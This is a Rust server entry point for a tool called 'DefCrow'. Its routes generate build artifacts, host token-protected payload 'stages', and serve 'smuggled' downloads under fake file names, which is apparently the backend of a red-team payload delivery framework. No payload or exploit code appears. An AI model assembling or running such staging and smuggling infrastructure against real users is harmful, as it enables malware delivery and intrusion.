use web_server::{api, builder, config, middleware, state, ws};
use axum::{middleware as axum_mw, routing::{delete, get, post}, Router};
use tower_http::{cors::CorsLayer, services::ServeDir};
use tracing_subscriber::EnvFilter;
use rand::Rng;
use std::net::SocketAddr;
use std::path::PathBuf;

use builder::{job_store::JobStore, scaffold::build_scaffold_rlib};
use config::Config;
use middleware::auth::{LoginRateLimiter, require_auth, SessionStore};
use middleware::require_admin::require_admin;
use state::AppState;

pub fn build_router(state: AppState) -> Router {
    let stage_authed = Router::new()
        .route("/api/v1/stage",           post(api::stage::upload_stage))
        .route("/api/v1/stage",           get(api::stage::list_stages))
        .route("/api/v1/stage/:pid",      delete(api::stage::delete_stage))
        .route("/api/v1/stage/:pid/token", post(api::stage::rotate_token))
        .route_layer(axum_mw::from_fn_with_state(state.clone(), require_auth));

    let protected = Router::new()
        .route("/api/generate",        post(api::generate::generate))
        .route("/api/jobs/:id",        get(api::jobs::get_job_status))
        .route("/api/jobs/:id",        delete(api::jobs::delete_job))
        .route("/api/download/:id",    get(api::download::download_artifact))
        .route("/api/v1/smug",         post(api::smuggler::create_smug))
        .route_layer(axum_mw::from_fn_with_state(state.clone(), require_auth));

    // Admin routes: role check on top of auth check. `route_layer`
    // applies layers in reverse-add order, so `require_auth` runs
    // first per request and `require_admin` reads the injected claims.
    let admin = Router::new()
        .route("/api/admin/users",            get(api::admin::list_users).post(api::admin::add_user))
        .route("/api/admin/users/:username",  delete(api::admin::delete_user))
        .route("/api/admin/settings",         get(api::admin::get_settings).put(api::admin::put_settings))
        .route_layer(axum_mw::from_fn(require_admin))
        .route_layer(axum_mw::from_fn_with_state(state.clone(), require_auth));

    Router::new()
        .route("/api/auth/request-key",  post(api::auth_keys::request_key))
        .route("/api/auth/login",        post(api::auth_keys::login))
        .route("/api/auth/logout",       post(api::auth::logout))
        .route("/api/health",            get(|| async { "ok" }))
        .route("/ws/jobs/:id",           get(ws::progress::ws_job_progress))
        // Stage fetch uses Bearer JWT — no session cookie required
        .route("/api/v1/stage/:pid",     get(api::stage::fetch_stage))
        .route("/d/:link_id/:fake_name", get(api::smuggler::serve_smug))
        .merge(stage_authed)
        .merge(protected)
        .merge(admin)
        .fallback_service(ServeDir::new("frontend/dist"))
        .with_state(state)
        .layer(CorsLayer::permissive())
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    let mut cfg = Config::from_env().expect("failed to load config");

    let workspace = std::env::var("DEFCROW_WORKSPACE").unwrap_or_else(|_| ".".into());
    let rlib = build_scaffold_rlib(&workspace).expect("failed to build libscaffold.rlib");
    cfg.scaffold_rlib = rlib;

    let staged_dir = PathBuf::from(&cfg.artifacts_dir).join("staged");
    std::fs::create_dir_all(&staged_dir).expect("failed to create staged dir");

    let smuggler_dir = PathBuf::from(&cfg.artifacts_dir).join("smuggler");
    std::fs::create_dir_all(&smuggler_dir).expect("failed to create smuggler dir");

    let staged_key: [u8; 32] = rand::thread_rng().gen();

    // Bootstrap auth state from `${artifacts_dir}`.
    //
    // `UserStore::load` returns the parsed file if it exists, or
    // seeds a single admin (with `bootstrap_username`) and persists it
    // when missing. We re-check `users.json` existence beforehand so
    // we can emit a one-time stderr notice (and seed the webhook from
    // env) only on a true fresh-install path, not on every reload.
    let artifacts_path = PathBuf::from(&cfg.artifacts_dir);
    std::fs::create_dir_all(&artifacts_path)
        .expect("failed to create artifacts dir");
    let users_path        = artifacts_path.join("users.json");
    let auth_settings_path = artifacts_path.join("auth_settings.json");
    let fresh_users    = !users_path.exists();
    let fresh_settings = !auth_settings_path.exists();

    let user_store_inner = web_server::auth::UserStore::load(&artifacts_path, &cfg.bootstrap_username)
        .expect("failed to load users.json");
    if fresh_users {
        eprintln!(
            "Admin user '{}' bootstrapped. Configure Discord webhook before first login.",
            cfg.bootstrap_username,
        );
    }
    let user_store = std::sync::Arc::new(tokio::sync::RwLock::new(user_store_inner));

    let mut auth_settings_inner = web_server::auth::AuthSettings::load(&artifacts_path)
        .expect("failed to load auth_settings.json");
    if fresh_settings {
        if let Some(url) = cfg.bootstrap_webhook.clone() {
            auth_settings_inner.set_webhook(Some(url));
            auth_settings_inner.save(&artifacts_path)
                .expect("failed to persist bootstrap auth_settings.json");
        }
    }
    let auth_settings = std::sync::Arc::new(tokio::sync::RwLock::new(auth_settings_inner));

    let key_store     = std::sync::Arc::new(web_server::auth::KeyStore::new());

    // Periodically purge expired/used pending keys so a long-running
    // server does not accumulate dead entries.
    {
        let ks = key_store.clone();
        tokio::spawn(async move {
            let mut t = tokio::time::interval(std::time::Duration::from_secs(60));
            loop { t.tick().await; ks.cleanup(); }
        });
    }

    let state = AppState {
        config:              cfg.clone(),
        sessions:            SessionStore::new(),
        jobs:                JobStore::new(),
        rate_limiter:        LoginRateLimiter::new(5, 60),
        generate_limiter:    LoginRateLimiter::new(20, 60),
        request_key_limiter: LoginRateLimiter::new(3, 60),
        ip_rate_limiter:     LoginRateLimiter::new(20, 60),
        staged_key,
        staged_dir,
        smuggler_dir,
        user_store,
        auth_settings,
        key_store,
    };

    web_server::api::cleanup::spawn_cleanup_task(cfg.artifacts_dir.clone());

    let addr = format!("0.0.0.0:{}", cfg.port);
    let app  = build_router(state);

    tracing::info!("DefCrow server listening on {}", addr);
    let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
    // Propagate the peer SocketAddr so auth handlers can pull
    // `ConnectInfo<SocketAddr>` for per-IP rate limiting.
    axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>())
        .await
        .unwrap();
}
